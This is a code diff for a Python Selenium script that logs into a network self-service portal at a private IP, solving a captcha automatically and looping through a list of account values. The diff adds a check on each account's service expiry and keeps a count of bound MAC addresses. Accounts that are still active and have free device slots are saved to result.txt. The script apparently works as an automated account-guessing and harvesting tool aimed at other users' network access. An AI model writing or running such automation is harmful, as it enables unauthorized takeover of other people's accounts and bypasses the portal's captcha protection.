@@ -12,7 +12,7 @@ from selenium.common.exceptions import UnexpectedAlertPresentException
 
 op = webdriver.Chrome()
 URL = 'http://172.16.254.82/selfLogon.do'
-num = '0000'
+num = '0164'
 wait = WebDriverWait(op, 10)
 name = "JXJJXX"
 valiable = list()
@@ -49,6 +49,13 @@ def login(num):
     time.sleep(2)
     op.find_element_by_name("validateCode").send_keys(get_captcha())
 
+def pd(s):
+    res = int()
+    for i in s:
+        if i == ':':
+            res += 1
+    return res == 2
+
 def work(num):
     try:
         op.get(URL)
@@ -58,6 +65,7 @@ def work(num):
     login(num)
     tmpqwq = 1
     not_ok = int()
+    # 尝试验证码与密码
     while 1:
         try:
             tmp = wait.until(EC.presence_of_element_located((By.NAME, "mainFrame")))
@@ -74,7 +82,30 @@ def work(num):
     if not_ok == 1:
         return 
     op.switch_to.frame(tmp)
+    # 获取到期时间
+    tmp = op.find_elements(By.CSS_SELECTOR, "td[bgcolor=\"FFFFFF\"][align=\"center\"]")
+    have_been = int()
+    is_ok = int()
+    for e in tmp:
+        if pd(e.text):
+            print(e.text)
+            print(have_been)
+            if have_been <= 2:
+                have_been += 1
+            else:
+                year = int(e.text[0 : 4])
+                month = int(e.text[5 : 7])
+                day = int(e.text[8 : 10])
+                nyear = int(time.strftime("%Y", time.localtime()))
+                nmonth = int(time.strftime("%m", time.localtime()))
+                nday = int(time.strftime("%d", time.localtime()))
+                if year < nyear or day < nday or month < nmonth:
+                    is_ok = 0
+                else:
+                    is_ok = 1
+    print(is_ok)
     time.sleep(0.5)
+    # 判断 MAC 地址
     wait.until(EC.presence_of_element_located((By.LINK_TEXT, "绑定信息"))).click()
     time.sleep(0.5)
     ele = op.find_elements(By.CSS_SELECTOR, "[bgcolor=\"DAE1EF\"]+td")
@@ -85,7 +116,8 @@ def work(num):
             if s == ':':
                 ans += 1
     print(str(num) + " = " + str(ans))
-    if ans < 15:
+    if ans < 15 and is_ok:
+        print("True")
         return True
     else:
         return False    
@@ -107,8 +139,9 @@ if __name__ == '__main__':
                 if not len(line):
                     continue
                 valiable.append(line)
+        os.remove("result.txt")
         for now in valiable:
             if work(now):
-                with open("result.txt", 'w') as out:
+                with open("result.txt", 'a') as out:
                     out.write(now + '\n')
     op.quit()
